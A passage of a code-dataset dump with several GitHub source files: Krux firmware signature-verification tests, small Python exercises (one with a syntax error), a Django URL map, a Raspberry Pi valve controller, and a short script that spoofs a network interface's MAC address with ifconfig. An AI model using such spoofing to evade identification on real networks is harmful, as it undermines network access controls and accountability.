)\n    mocker.patch(\n        \"os.listdir\",\n        new=mocker.MagicMock(\n            return_value=[\"firmware-v0.0.0.bin\", \"firmware-v0.0.0.bin.sig\"]\n        ),\n    )\n    mocker.patch(\"krux.firmware.Display\", new=mocker.MagicMock())\n    mocker.patch(\"krux.firmware.Input\", new=mock_fail_input_cls)\n    from krux import firmware\n\n    assert not firmware.upgrade()\n\n\ndef test_upgrade_fails_when_firmware_too_big(\n    mocker, m5stickv, mock_success_input_cls, tdata\n):\n    mocker.patch(\n        \"builtins.open\",\n        new=get_mock_open(\n            {\n                \"/sd/firmware-v0.0.0.bin\": tdata.TEST_FIRMWARE,\n                \"/sd/firmware-v0.0.0.bin.sig\": tdata.TEST_FIRMWARE_SIG,\n            }\n        ),\n    )\n    mocker.patch(\n        \"os.listdir\",\n        new=mocker.MagicMock(\n            return_value=[\"firmware-v0.0.0.bin\", \"firmware-v0.0.0.bin.sig\"]\n        ),\n    )\n    mocker.patch(\"krux.firmware.Display\", new=mocker.MagicMock())\n    mocker.patch(\"krux.firmware.Input\", new=mock_success_input_cls)\n    mocker.patch(\"krux.firmware.fsize\", new=lambda f: firmware.MAX_FIRMWARE_SIZE + 1)\n    from krux import firmware\n\n    assert not firmware.upgrade()\n\n\ndef test_upgrade_fails_when_pubkey_is_invalid(\n    mocker, m5stickv, mock_success_input_cls, tdata\n):\n    mocker.patch(\n        \"builtins.open\",\n        new=get_mock_open(\n            {\n                \"/sd/firmware-v0.0.0.bin\": tdata.TEST_FIRMWARE,\n                \"/sd/firmware-v0.0.0.bin.sig\": tdata.TEST_FIRMWARE_SIG,\n            }\n        ),\n    )\n    mocker.patch(\n        \"os.listdir\",\n        new=mocker.MagicMock(\n            return_value=[\"firmware-v0.0.0.bin\", \"firmware-v0.0.0.bin.sig\"]\n        ),\n    )\n    mocker.patch(\"krux.firmware.Display\", new=mocker.MagicMock())\n    mocker.patch(\"krux.firmware.Input\", new=mock_success_input_cls)\n    mocker.patch(\"krux.firmware.SIGNER_PUBKEY\", \"abc123\")\n    from krux import firmware\n\n    assert not firmware.upgrade()\n\n\ndef test_upgrade_fails_when_sig_file_missing(\n    mocker, m5stickv, mock_success_input_cls, tdata\n):\n    mocker.patch(\n        \"builtins.open\",\n        new=get_mock_open(\n            {\n                \"/sd/firmware-v0.0.0.bin\": tdata.TEST_FIRMWARE,\n                \"/sd/firmware-v0.0.0.bin.sig\": \"Exception\",\n            }\n        ),\n    )\n    mocker.patch(\n        \"os.listdir\",\n        new=mocker.MagicMock(\n            return_value=[\"firmware-v0.0.0.bin\", \"firmware-v0.0.0.bin.sig\"]\n        ),\n    )\n    mocker.patch(\"krux.firmware.Display\", new=mocker.MagicMock())\n    mocker.patch(\"krux.firmware.Input\", new=mock_success_input_cls)\n    mocker.patch(\"krux.firmware.SIGNER_PUBKEY\", tdata.TEST_SIGNER_PUBKEY)\n    from krux import firmware\n\n    assert not firmware.upgrade()\n\n\ndef test_upgrade_fails_when_sig_is_invalid(\n    mocker, m5stickv, mock_success_input_cls, tdata\n):\n    mocker.patch(\n        \"builtins.open\",\n        new=get_mock_open(\n            {\n                \"/sd/firmware-v0.0.0.bin\": tdata.TEST_FIRMWARE,\n                \"/sd/firmware-v0.0.0.bin.sig\": \"abc123\",\n            }\n        ),\n    )\n    mocker.patch(\n        \"os.listdir\",\n        new=mocker.MagicMock(\n            return_value=[\"firmware-v0.0.0.bin\", \"firmware-v0.0.0.bin.sig\"]\n        ),\n    )\n    mocker.patch(\"krux.firmware.Display\", new=mocker.MagicMock())\n    mocker.patch(\"krux.firmware.Input\", new=mock_success_input_cls)\n    mocker.patch(\"krux.firmware.SIGNER_PUBKEY\", tdata.TEST_SIGNER_PUBKEY)\n    from krux import firmware\n\n    assert not firmware.upgrade()\n\n\ndef test_upgrade_fails_when_sig_is_malformed(\n    mocker, m5stickv, mock_success_input_cls, tdata\n):\n    mocker.patch(\n        \"builtins.open\",\n        new=get_mock_open(\n            {\n                \"/sd/firmware-v0.0.0.bin\": tdata.TEST_FIRMWARE,\n                \"/sd/firmware-v0.0.0.bin.sig\": tdata.TEST_FIRMWARE_MALFORMED_SIG,\n            }\n        ),\n    )\n    mocker.patch(\n        \"os.listdir\",\n        new=mocker.MagicMock(\n            return_value=[\"firmware-v0.0.0.bin\", \"firmware-v0.0.0.bin.sig\"]\n        ),\n    )\n    mocker.patch(\"krux.firmware.Display\", new=mocker.MagicMock())\n    mocker.patch(\"krux.firmware.Input\", new=mock_success_input_cls)\n    mocker.patch(\"krux.firmware.SIGNER_PUBKEY\", tdata.TEST_SIGNER_PUBKEY)\n    from krux import firmware\n\n    assert not firmware.upgrade()\n\n\ndef test_upgrade_fails_when_sig_is_bad(mocker, m5stickv, mock_success_input_cls, tdata):\n    mocker.patch(\n        \"builtins.open\",\n        new=get_mock_open(\n            {\n                \"/sd/firmware-v0.0.0.bin\": tdata.TEST_FIRMWARE,\n                \"/sd/firmware-v0.0.0.bin.sig\": tdata.TEST_FIRMWARE_BAD_SIG,\n            }\n        ),\n    )\n    mocker.patch(\n        \"os.listdir\",\n        new=mocker.MagicMock(\n            return_value=[\"firmware-v0.0.0.bin\", \"firmware-v0.0.0.bin.sig\"]\n        ),\n    )\n    mocker.patch(\"krux.firmware.Display\", new=mocker.MagicMock())\n    mocker.patch(\"krux.firmware.Input\", new=mock_success_input_cls)\n    mocker.patch(\"krux.firmware.SIGNER_PUBKEY\", tdata.TEST_SIGNER_PUBKEY)\n    from krux import firmware\n\n    assert not firmware.upgrade()\n\n\ndef test_upgrade_fails_when_both_sectors_missing_active_firmware(\n    mocker, m5stickv, mock_success_input_cls, tdata\n):\n    mocker.patch(\"krux.firmware.flash\", new=mocker.MagicMock())\n    mocker.patch(\n        \"builtins.open\",\n        new=get_mock_open(\n            {\n                \"/sd/firmware-v0.0.0.bin\": tdata.TEST_FIRMWARE,\n                \"/sd/firmware-v0.0.0.bin.sig\": tdata.TEST_FIRMWARE_SIG,\n            }\n        ),\n    )\n    mocker.patch(\n        \"os.listdir\",\n        new=mocker.MagicMock(\n            return_value=[\"firmware-v0.0.0.bin\", \"firmware-v0.0.0.bin.sig\"]\n        ),\n    )\n    mocker.patch(\"krux.firmware.Display\", new=mocker.MagicMock())\n    mocker.patch(\"krux.firmware.Input\", new=mock_success_input_cls)\n    mocker.patch(\"krux.firmware.SIGNER_PUBKEY\", tdata.TEST_SIGNER_PUBKEY)\n    mocker.patch(\n        \"krux.firmware.flash.read\",\n        new=mocker.MagicMock(return_value=bytes(tdata.SECTOR_WITH_NO_ACTIVE_FIRMWARE)),\n    )\n    from krux import firmware\n\n    assert not firmware.upgrade()\n"}
{"blob_id": "eefbcec491eae84ea74122ad52d7e579bad33475", "directory_id": "0da7fd4973c11a3caa04c4df678a8a05cc7ec611", "path": "/random_set7_13.py", "content_id": "bf715025a22bbe0088cd83f2b63c4855ca607ca0", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "zekoliu/CorePythonProgramming", "snapshot_id": "f323a5463189bce8c0381079b7b08f5d6161502d", "revision_id": "79417b815ef7e263691098dfcf224388244362e7", "branch_name": "refs/heads/master", "visit_date": "2020-03-12 00:53:39.132730", "revision_date": "2018-06-02 02:45:31", "committer_date": "2018-06-02 02:45:31", "github_id": "130360851", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "239", "extension": "py", "content": "\nimport random\n\none = set()\ntwo = set()\n\nfor i in range(10):\n    one_element = random.randint(1, 10)\n    one.add(one_element)\n\nfor i in range(10):\n    two_element = random.randint(1, 10)\n    two.add(two_element)\n\nprint one | two, one & two"}
{"blob_id": "2e61efae2e39f44cfbb1487b063183038b3ccfe5", "directory_id": "e98369b9bce6c48d19839eb8891131eb6da58e81", "path": "/mac_changer.py", "content_id": "e013835ec479b62bc2e89913df91edf20528b762", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "newt9n/pycharm88", "snapshot_id": "3f91b4aa289321fd680903b56fbda6f046111b57", "revision_id": "25cc536cfb034d49d75cfc063e69c9c3eeb153dc", "branch_name": "refs/heads/master", "visit_date": "2020-09-10 21:52:38.545146", "revision_date": "2019-11-17 10:52:56", "committer_date": "2019-11-17 10:52:56", "github_id": "221844695", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "602", "extension": "py", "content": "#!/usr/bin/env python\n\nimport subprocess\nimport optparse\n\nparser = optparse.OptionParser()\n\nparser.add_option(\"-i\", \"--interface\", dest=\"interface\", help=\"Interface to change its MAC address\")\nparser.add_option(\"-m\", \"--mac\", dest=\"new_mac\", help=\"New Mac address\")\n\n(options, arguments) = parser.parse_args()\n\ninterface = options.interface\nnew_mac = options.new_mac\n\nprint(\"[+]  Changing MAC address for \" + interface + \" to \" + new_mac)\n\nsubprocess.call([\"ifconfig\", interface, \"down\"])\nsubprocess.call([\"ifconfig\", interface, \"hw\", \"ether\", new_mac])\nsubprocess.call([\"ifconfig\", interface, \"up\"])\n\n"}
{"blob_id": "91c9cafa4b63c344f76d7d372deba7a3689fce98", "directory_id": "bbdac845e2f5374a8dc7565306ad63b8fcebe535", "path": "/erp/urls.py", "content_id": "9c2b31e0ee77e7c2e035e8e22161c254d58f1650", "detected_licenses": "['MIT']", "license_type": "permissive", "repo_name": "urkh/erp", "snapshot_id": "08ae0f35ce2bf3d9f575bcd484e2bb4f973a5537", "revision_id": "57b68fd29bb67ad1c64fca596fc90b12d8a53113", "branch_name": "refs/heads/master", "visit_date": "2021-01-10 21:42:35.282836", "revision_date": "2013-11-18 04:37:19", "committer_date": "2013-11-18 04:37:19", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1708", "extension": "py", "content": "from django.conf.urls import patterns, include, url\n\nfrom django.contrib import admin\nadmin.autodiscover()\n\nurlpatterns = patterns('',\n    \n\n    url(r'^$', 'modulos.dashboard.views.dashboard'),\n\n    url(r'^clientes/$', 'modulos.clientes.views.clientes'),\n    url(r'^clientes/(\\d+)/$', 'modulos.clientes.views.cliente'),\n    url(r'^clientes/nuevo/$', 'modulos.clientes.views.nuevo_cliente'),\n    \n    url(r'^articulos/$', 'modulos.articulos.views.articulos'),\n    url(r'^articulos/(\\d+)/$', 'modulos.articulos.views.articulo'),\n    url(r'^articulos/nuevo/$', 'modulos.articulos.views.nuevo_articulo'),\n\n    url(r'^proveedores/$', 'modulos.proveedores.views.proveedores'),\n    url(r'^proveedores/(\\d+)/$', 'modulos.proveedores.views.proveedor'),\n    url(r'^proveedores/nuevo/$', 'modulos.proveedores.views.nuevo_proveedor'),   \n\n    url(r'^ventas/$', 'modulos.ventas.views.ventas'),\n    url(r'^ventas/(\\d+)/$', 'modulos.ventas.views.venta'),\n    url(r'^ventas/nuevo/$', 'modulos.ventas.views.nuevo_venta'),   \n\n    url(r'^pedidos/$', 'modulos.pedidos.views.pedidos'),\n    url(r'^pedidos/(\\d+)/$', 'modulos.pedidos.views.pedido'),\n    url(r'^pedidos/nuevo/$', 'modulos.pedidos.views.nuevo_pedido'),   \n    \n    #url(r'^estadisticas/$', 'modulos.estadisticas.views.estadisticas'),\n    #url(r'^estadisticas/(+d)/$', 'modulos.estadisticas.views.estadistica'),\n    #url(r'^estadisticas/nuevo/$', 'modulos.estadisticas.views.nuevo_estadistica'),   \n\n    url(r'^materiales/$', 'modulos.materiales.views.materiales'),\n    url(r'^materiales/(\\d+)/$', 'modulos.materiales.views.material'),\n    url(r'^materiales/nuevo/$', 'modulos.materiales.views.nuevo_material'),   \n\n\n    url(r'^admin/', include(admin.site.urls)),\n)\n"}
{"blob_id": "18e9295e97ab81fcc39d33ebd4605505a63da9db", "directory_id": "de24f83a5e3768a2638ebcf13cbe717e75740168", "path": "/moodledata/vpl_data/7/usersdata/74/4449/submittedfiles/esferas.py", "content_id": "19dc11065165f216271b0a42907b5e5cdbc2e5b2", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "rafaelperazzo/programacao-web", "snapshot_id": "95643423a35c44613b0f64bed05bd34780fe2436", "revision_id": "170dd5440afb9ee68a973f3de13a99aa4c735d79", "branch_name": "refs/heads/master", "visit_date": "2021-01-12 14:06:25.773146", "revision_date": "2017-12-22 16:05:45", "committer_date": "2017-12-22 16:05:45", "github_id": "69566344", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "308", "extension": "py", "content": "# -*- coding: utf-8 -*-\nfrom __future__ import division\n\ne1 = input('Volume da primeira esfera')\ne2 = input('Volume da segunda esfera')\ne3 = input('Volume da terceira esfera')\ne4 = input('Volume da quarta esfera')\n\na = e2+e3+e4\nd = e2+e3\n\nif a = e1 and d = e4 and e2 = e3:\n    print('S')\nelse:\n    print('N')"}
{"blob_id": "61cb0b61b7cbffa396d3a8c4eefdec73531541e2", "directory_id": "cd71de79e8a3384e23c41cecf3544e2181980f40", "path": "/arbo/bin/vezerlok/p1.py", "content_id": "dda3c68ff7b8ade0c466ee13eb88e5347fba02f2", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "arboinvest/savazo", "snapshot_id": "9df696c99f7ab0e3dc48bc94e3583f872c6c1d7c", "revision_id": "cd9e951da455dcf8021d2cb0b7ef33d7fb7ab175", "branch_name": "refs/heads/master", "visit_date": "2023-06-30 09:17:54.189580", "revision_date": "2021-07-29 13:07:00", "committer_date": "2021-07-29 13:07:00", "github_id": "390263885", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "15055", "extension": "py", "content": "\ufeffimport requests\nimport syslog\nimport sys\nimport time\nimport os\nfrom time import mktime\nimport datetime\nimport requests\nimport RPi.GPIO as GPIO\nfrom os import path\n\nprint 'init GPIO';\n\nGPIO.setmode(GPIO.BCM)\n\nprint 'init sys';\nreload(sys)\nsys.setdefaultencoding('utf8')\n\nprint 'init w1';\n#os.system('modprobe w1-gpio')\n#os.system('modprobe w1-therm')\n\ng27 = '28-03099779fe76'\ng25 = '28-0317248346ff'\ng27Path = '/sys/bus/w1/devices/' + g27 + '/w1_slave'\ng25Path = '/sys/bus/w1/devices/' + g25 + '/w1_slave'\ng25Exists = True\ng27Exists = True\n\n# server url ip address\nserverURL = '***.***.***.***'\napiService = \"http://\" + serverURL + \"/index.php\"\napiTimeout = 5\n\nif (not path.exists(g27Path)):\n    g27Exists = False\n\nif (not path.exists(g25Path)):\n    g25Exists = False\n\ng27Value = '0.0'\ng25Value = '0.0'\ncnt = 0\n\n# konstansok\nV2_ZARVA = 22;\nV2_NYITVA = 21;\nV4_ZARVA = 20;\nV4_NYITVA = 19;\nV2_V4_VEZERLES = 18;\nV1_V3_VEZERLES = 17;\nV1_ZARVA = 16;\nV1_NYITVA = 13;\nV3_ZARVA = 12;\nV3_NYITVA = 6;\nV1_V3_VEZERLES_NYITAS = 0;\nV1_V3_VEZERLES_ZARAS = 1;\nV2_V4_VEZERLES_NYITAS = 1;\nV2_V4_VEZERLES_ZARAS = 0;\n\ndef read_temp_raw(file):\n    f = open(file, 'r')\n    lines = f.readlines()\n    f.close()\n    return lines\n\ndef read_temp(file):\n    lines = ''\n\n    try:\n        lines = read_temp_raw(file)\n    except:\n        return 0.0\n\n    if (lines[0].strip()[-3:] != 'YES'):\n        return 0.0\n\n    equals_pos = lines[1].find('t=')\n    if equals_pos != -1:\n        temp_string = lines[1][equals_pos+2:]\n        temp_c = float(temp_string) / 1000.0\n        return temp_c\n\ndef pillangoSzelepAllapot():\n    if GPIO.input(V2_ZARVA) == 0 and GPIO.input(V4_ZARVA) == 0:\n        return 0\n    elif GPIO.input(V2_NYITVA) == 0 and GPIO.input(V4_NYITVA) == 0:\n        return 1\n    else:\n        return 2\n\ndef pillangoSzelepZaras():\n    if GPIO.input(V2_ZARVA) != 0 or GPIO.input(V4_ZARVA) != 0:\n        GPIO.output(V2_V4_VEZERLES, 0);\n\ttime.sleep(1)\n    t = 0\n    while GPIO.input(V2_ZARVA) != 0 or GPIO.input(V4_ZARVA) != 0:\n        time.sleep(1)\n        if (t % 8) == 0:\n            allapotTarolas(allapotUzenetLetrehozasa())\n        t = t + 1\n    return 1\n\ndef pillangoSzelepNyitas():\n    if (GPIO.input(V1_ZARVA) != 0 or GPIO.input(V3_ZARVA) != 0):\n        keres = requests.post(apiService, data={'action': 5})\n        return 0\n    if GPIO.input(V2_NYITVA) != 0 or GPIO.input(V4_NYITVA) != 0:\n        GPIO.output(V2_V4_VEZERLES, 1);\n\ttime.sleep(1)\n    t = 0\n    while GPIO.input(V2_NYITVA) != 0 or GPIO.input(V4_NYITVA) != 0:\n        time.sleep(1)\n        if (t % 8) == 0:\n            allapotTarolas(allapotUzenetLetrehozasa())\n        t = t + 1\n    return 1\n\ndef golyosSzelepAllapot():\n    if GPIO.input(V1_ZARVA) == 0 and GPIO.input(V3_ZARVA) == 0:\n        return 0\n    elif GPIO.input(V1_NYITVA) == 0 and GPIO.input(V3_NYITVA) == 0:\n        return 1\n    else:\n        return 2\n\ndef golyosSzelepZaras():\n    if GPIO.input(V1_ZARVA) != 0 or GPIO.input(V3_ZARVA) != 0:\n        GPIO.output(V1_V3_VEZERLES, 1);\n\ttime.sleep(1)\n    t = 0\n    while GPIO.input(V1_ZARVA) != 0 or GPIO.input(V3_ZARVA) != 0:\n        time.sleep(1)\n        if (t % 8) == 0:\n            allapotTarolas(allapotUzenetLetrehozasa())\n        t = t + 1\n    return 1\n\ndef golyosSzelepNyitas():\n    if (GPIO.input(V2_ZARVA) != 0 or GPIO.input(V4_ZARVA) != 0):\n        keres = requests.post(apiService, data={'action': 4})\n        return 0\n    if GPIO.input(V1_NYITVA) != 0 or GPIO.input(V3_NYITVA) != 0:\n        GPIO.output(V1_V3_VEZERLES, 0);\n\ttime.sleep(1)\n    t = 0\n    while GPIO.input(V1_NYITVA) != 0 or GPIO.input(V3_NYITVA) != 0:\n        time.sleep(1)\n        if (t % 8) == 0:\n            allapotTarolas(allapotUzenetLetrehozasa())\n        t = t + 1\n    return 1\n\ndef init():\n    GPIO.setup(27, GPIO.IN)\n    GPIO.setup(25, GPIO.IN)\n    GPIO.setup(V2_ZARVA, GPIO.IN)\n    GPIO.setup(V2_NYITVA, GPIO.IN)\n    GPIO.setup(20, GPIO.IN)\n    GPIO.setup(19, GPIO.IN)\n    GPIO.setup(18, GPIO.OUT)\n    GPIO.setup(17, GPIO.OUT)\n    GPIO.setup(16, GPIO.IN)\n    GPIO.setup(13, GPIO.IN)\n    GPIO.setup(12, GPIO.IN)\n    GPIO.setup(6, GPIO.IN)\n\n\ndef bejelentkezes():\n    keres = requests.post(apiService, data={'action': 0})\n    if keres.status_code == 200:\n        if keres.text == '-11109':\n            print \"Adatb\u00e1zis kapcsolat hiba!\"\n        elif keres.text == '-11111':\n            print \"Nem azonos\u00edtott eszk\u00f6z, ellen\u00f6rizze a be\u00e1ll\u00edt\u00e1sokat!\"\n        elif keres.text == '-11110':\n            print \"Ismeretlen parancs!\"\n        elif keres.text != '0':\n            print \"\u00dczemm\u00f3d hiba!\"\n        else:\n            return keres.text\n    else:\n        print \"Kapcsol\u00f3d\u00e1si hiba!\"\n    return -1\n\ndef allapotTarolas(ertekek):\n\n    try:\n        keres = requests.post(apiService, data={'action': 1, 'ertekek':ertekek}, timeout=apiTimeout)\n        if keres.status_code == 200:\n            if keres.text == '-11109':\n                print \"Adatb\u00e1zis kapcsolat hiba!\"\n            elif keres.text == '-11111':\n                print \"Nem azonos\u00edtott eszk\u00f6z, ellen\u00f6rizze a be\u00e1ll\u00edt\u00e1sokat!\"\n            elif keres.text == '-11110':\n                print \"Ismeretlen parancs!\"\n            elif keres.text != '1':\n                print \"\u00c1ltal\u00e1nos hiba!\"\n            else:\n                return keres.text\n        else:\n            print \"Kapcsol\u00f3d\u00e1si hiba!\"\n\n    except requests.Timeout:\n        pass\n    except requests.ConnectionError:\n        pass    \n    \n    return -1\n\ndef utasitasLekerdezes():\n    try:\n\n        keres = requests.post(apiService, data={'action': 2}, timeout=apiTimeout)\n        if keres.status_code == 200:\n            if keres.text == '-11109':\n                print \"Adatb\u00e1zis kapcsolat hiba!\"\n            elif keres.text == '-11111':\n                print \"Nem azonos\u00edtott eszk\u00f6z, ellen\u00f6rizze a be\u00e1ll\u00edt\u00e1sokat!\"\n            elif keres.text == '-11110':\n                print \"Ismeretlen parancs!\"\n            else:\n                return keres.text\n        else:\n            print \"Kapcsol\u00f3d\u00e1si hiba!\"\n    \n    except requests.Timeout:\n        pass\n    except requests.ConnectionError:\n        pass    \n    \n    return -1\n\ndef utasitasVisszajelzes(allapot):\n    keres = requests.post(apiService, data={'action': 3, 'allapot':allapot})\n    if keres.status_code == 200:\n        if keres.text == '-11109':\n            print \"Adatb\u00e1zis kapcsolat hiba!\"\n        elif keres.text == '-11111':\n            print \"Nem azonos\u00edtott eszk\u00f6z, ellen\u00f6rizze a be\u00e1ll\u00edt\u00e1sokat!\"\n        elif keres.text == '-11110':\n            print \"Ismeretlen parancs!\"\n        else:\n            return keres.text\n    else:\n        print \"Kapcsol\u00f3d\u00e1si hiba!\"\n    return -1\n\ndef uzemAllapotBeallitas():\n    global boot\n    # if boot == 1:\n    # asyncSleep(5)\n\n    #zar pillangot\n    #ha pillango zart -> nyit 2 percre a golyost, aztan zar\n    #ha a golyos z\u00e1rva -> nyitas pillango\n    # uzemallapot ha golyosok zarva \u00e9s pillango nyitva\n\n    keres = requests.post(apiService, data={'action': 20})\n\n    print \"pillangoSzelepZaras()\"\n    pillangoSzelepZaras()\n    print \"pillangoSzelepZaras()..kesz\"\n    allapotTarolas(allapotUzenetLetrehozasa())\n    pillangoszelep = pillangoSzelepAllapot()\n    if (pillangoszelep == 0):\n        print \"golyosSzelepNyitas()\"\n        golyosSzelepNyitas()\n        print \"golyosSzelepNyitas()..kesz\"\n        allapotTarolas(allapotUzenetLetrehozasa())\n        print \"asyncSleep(30)\"\n        asyncSleep(30)\n        print \"asyncSleep(30)..kesz\"\n        print \"golyosSzelepZaras()\"\n        golyosSzelepZaras()\n        print \"golyosSzelepZaras()..kesz\"\n        allapotTarolas(allapotUzenetLetrehozasa())\n\n        golyosszelep = golyosSzelepAllapot()\n        #print \"golyosSzelepAllapot = \" + str(golyosszelep)\n        if (golyosszelep == 0):\n            print \"pillangoSzelepNyitas()\"\n            pillangoSzelepNyitas()\n            print \"pillangoSzelepNyitas()..kesz\"\n            allapotTarolas(allapotUzenetLetrehozasa())\n\n    pillangoszelep = pillangoSzelepAllapot()\n    golyosszelep = golyosSzelepAllapot()\n\n    if (golyosszelep == 0 and pillangoszelep == 1):\n        utasitasVisszajelzes(1)\n        requests.post(apiService, data={'action': 22})\n\n    if boot == 1:\n        boot = 0\n    return 1\n\ndef zartAllapotBeallitas():\n    pillangoszelep = pillangoSzelepAllapot()\n    golyosszelep = golyosSzelepAllapot()\n    if golyosszelep == 1 or golyosszelep == 2:\n        golyosSzelepZaras()\n    if pillangoszelep == 1 or pillangoszelep == 2:\n        pillangoSzelepZaras()\n    utasitasVisszajelzes(2)\n    return 1\n\ndef savazoAllapotBeallitas():\n    pillangoszelep = pillangoSzelepAllapot()\n    golyosszelep = golyosSzelepAllapot()\n    if pillangoszelep == 1 or pillangoszelep == 2:\n        pillangoSzelepZaras()\n    if golyosszelep == 0 or golyosszelep == 2:\n        golyosSzelepNyitas()\n        time.sleep(60)\n    utasitasVisszajelzes(4)\n    return 1\n\ndef szelepVezerles(utasitas):\n\n    # v1,v3 nyit\u00e1s\n    if utasitas == 30 or utasitas == 34 :\n        # ha v2,v4 z\u00e1rva van\n        if GPIO.input(V2_ZARVA) == 0 and GPIO.input(V4_ZARVA) == 0 :\n            #nyit\u00e1s\n            GPIO.setup(V1_V3_VEZERLES, GPIO.OUT)\n            time.sleep(1)\n            GPIO.output(V1_V3_VEZERLES, V1_V3_VEZERLES_NYITAS)\n\n            # v\u00e1rakoz\u00e1s, \u00e9s k\u00f6ztes \u00e1llapot t\u00e1rol\u00e1sa\n            while GPIO.input(V1_ZARVA) == 0 or GPIO.input(V3_ZARVA) == 0 :\n                time.sleep(2)\n\n            uzenet = allapotUzenetLetrehozasa()\n            allapotTarolas(uzenet)\n            \n            while GPIO.input(V1_NYITVA) != 0 or GPIO.input(V3_NYITVA) != 0 :\n                time.sleep(2)\n            utasitasVisszajelzes(utasitas)\n\n            uzenet = allapotUzenetLetrehozasa()\n            allapotTarolas(uzenet)\n            \n            return 1\n        else :\n            #nem nyithat\u00f3\n            requests.post(apiService, data={'action': 4})\n            return 0\n\n    # v1,v3 z\u00e1r\u00e1s\n    elif utasitas == 31 or utasitas == 35 :\n        # akkor z\u00e1rhat\u00f3 ha a szivatty\u00fa \u00e1ll, vagy ha a bemen\u00f6,elmen\u00f6 oldalon tud keringtetni , ezt szerver oldalon kell majd ellen\u00f6rizni\n        if int(eszkozLekerdezes('p3', 'G22')) == 0 and (int(eszkozLekerdezes('p2', 'G13')) != 0 or int(eszkozLekerdezes('p2', 'G6')) != 0) :\n            requests.post(apiService, data={'action': 11})\n            return 0\n\n        GPIO.setup(V1_V3_VEZERLES, GPIO.OUT)\n        time.sleep(1)\n        GPIO.output(V1_V3_VEZERLES, V1_V3_VEZERLES_ZARAS)\n\n        # v\u00e1rakoz\u00e1s, \u00e9s k\u00f6ztes \u00e1llapot t\u00e1rol\u00e1sa\n        while GPIO.input(V1_NYITVA) == 0 or GPIO.input(V3_NYITVA) == 0 :\n            time.sleep(2)\n\n        uzenet = allapotUzenetLetrehozasa()\n        allapotTarolas(uzenet)\n        \n        while GPIO.input(V1_ZARVA) != 0 or GPIO.input(V3_ZARVA) != 0 :\n            time.sleep(2)\n        utasitasVisszajelzes(utasitas)\n\n        uzenet = allapotUzenetLetrehozasa()\n        allapotTarolas(uzenet)\n        \n        return 1\n\n    # v2,v4 nyit\u00e1s\n    elif utasitas == 32 or utasitas == 36 :\n        if GPIO.input(V1_ZARVA) == 0 and GPIO.input(V3_ZARVA) == 0 :\n            #nyit\u00e1s\n            GPIO.setup(V2_V4_VEZERLES, GPIO.OUT)\n            time.sleep(1)\n            GPIO.output(V2_V4_VEZERLES, V2_V4_VEZERLES_NYITAS)\n\n            # v\u00e1rakoz\u00e1s, \u00e9s k\u00f6ztes \u00e1llapot t\u00e1rol\u00e1sa\n            while GPIO.input(V2_ZARVA) == 0 or GPIO.input(V4_ZARVA) == 0 :\n                time.sleep(2)\n\n            uzenet = allapotUzenetLetrehozasa()\n            allapotTarolas(uzenet)\n            \n            while GPIO.input(V2_NYITVA) != 0 or GPIO.input(V4_NYITVA) != 0 :\n                time.sleep(2)\n            utasitasVisszajelzes(utasitas)\n\n            uzenet = allapotUzenetLetrehozasa()\n            allapotTarolas(uzenet)\n\n            return 1\n        else :\n            #nem nyithat\u00f3\n            requests.post(apiService, data={'action': 5})\n            return 0            \n\n    # v2,v4 z\u00e1r\u00e1s\n    elif utasitas == 33 or utasitas == 37 :\n        # akkor z\u00e1rhat\u00f3 ha a bemen\u00f6,elmen\u00f6 oldalon tud keringtetni , ezt szerver oldalon kell majd ellen\u00f6rizni\n        if int(eszkozLekerdezes('p2', 'G21')) != 0 or int(eszkozLekerdezes('p2', 'G19')) != 0 :\n            requests.post(apiService, data={'action': 12})\n            return 0\n\n        print \"v2,v4 z\u00e1r\u00e1s\"\n        GPIO.setup(V2_V4_VEZERLES, GPIO.OUT)\n        time.sleep(1)\n        GPIO.output(V2_V4_VEZERLES, V2_V4_VEZERLES_ZARAS)\n\n        print \"v\u00e1rakoz\u00e1s\"\n        # v\u00e1rakoz\u00e1s, \u00e9s k\u00f6ztes \u00e1llapot t\u00e1rol\u00e1sa\n        while GPIO.input(V2_NYITVA) == 0 or GPIO.input(V4_NYITVA) == 0 :\n            time.sleep(2)\n\n        uzenet = allapotUzenetLetrehozasa()\n        allapotTarolas(uzenet)\n\n        \n        while GPIO.input(V2_ZARVA) != 0 or GPIO.input(V4_ZARVA) != 0 :\n            time.sleep(2)\n        utasitasVisszajelzes(utasitas)\n\n        uzenet = allapotUzenetLetrehozasa()\n        allapotTarolas(uzenet)\n        \n        return 1\n\n    return 0\n\ndef eszkozLekerdezes(device, name):\n    keres = requests.post(apiService, data={'action': 10, 'device': device, 'name': name })\n    return keres.text\n\ndef allapotUzenetLetrehozasa():\n    global cnt\n    global g27Value\n    global g25Value\n\n    if cnt == 0:\n        cnt = 1\n        if g27Exists:\n            g27Value = str(read_temp(g27Path))\n        else:\n            g27Value = '0.0'\n\n        if g25Exists:\n            g25Value = str(read_temp(g25Path))\n        else:\n            g25Value = '0.0'\n    else:\n        cnt = cnt + 1\n        if (cnt >= 6):\n            cnt = 0\n\n    return ( \"G22:\" + str(GPIO.input(V2_ZARVA))\n     + \",G21:\" + str(GPIO.input(V2_NYITVA))\n     + \",G20:\" + str(GPIO.input(V4_ZARVA))\n     + \",G19:\" + str(GPIO.input(V4_NYITVA))\n     + \",G18:\" + str(GPIO.input(18))\n     + \",G17:\" + str(GPIO.input(17))\n     + \",G16:\" + 